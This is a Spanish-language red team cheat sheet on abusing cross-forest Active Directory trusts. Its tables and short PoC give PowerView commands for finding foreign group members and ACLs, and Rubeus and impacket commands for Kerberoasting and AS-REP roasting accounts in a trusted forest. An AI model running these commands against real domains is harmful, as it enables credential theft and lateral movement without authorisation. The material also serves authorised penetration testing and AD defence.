---
aliases:
  - Foreign Principals Audit
tags:
  - technique/discovery
  - technique/lateral-movement
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Inter-Forest Trust Abuse]]"
---
# Inter-Forest Trust Abuse - Foreign Access

> Cross-forest no hay escalada automática (SID filtering ON). El puente es el **acceso explícito** que un admin concedió: principals foráneos en grupos o con ACLs en el otro forest.

---

## Enumerar Acceso Concedido

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainForeignGroupMember -Domain target.forest` | Usuarios *foráneos* en grupos del otro forest | Hallar el puente de acceso. |
| `Get-DomainForeignUser -Domain target.forest` | Usuarios con membresías cross-forest | Recon de acceso. |
| `Get-DomainObjectAcl -Domain target.forest \| ? SecurityIdentifier -match '<MY_FOREST_SID>'` | ACLs que tu forest tiene sobre objetos del otro | Foreign ACL abuse. |
| `Get-DomainTrust -Domain corp.local \| ? TrustType -eq 'Forest'` | Trusts de bosque (dirección, transitividad) | Mapear el trust. |
^inter-foreign-enum

## Roasting Cross-Forest

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Rubeus.exe kerberoast /domain:target.forest` | Hashes de cuentas con SPN del otro forest | Si el trust permite la query. |
| `impacket-GetUserSPNs -target-domain target.forest corp.local/user:pass` | Kerberoast cross-forest (Linux) | Alternativa. |
| `Rubeus.exe asreproast /domain:target.forest` | AS-REP de cuentas sin preauth del otro forest | Roasting sin auth previa. |
^inter-foreign-roast

### PoC

```powershell
# 1. ¿Qué te dieron en el otro forest?
Get-DomainForeignGroupMember -Domain target.forest
# 2. Roastear cuentas del otro forest si el trust lo permite
Rubeus.exe kerberoast /domain:target.forest
```

---

> Cross-realm TGS y bypass de SID filtering mal configurado: [[Inter-Forest Trust Abuse - Cross-Realm]].
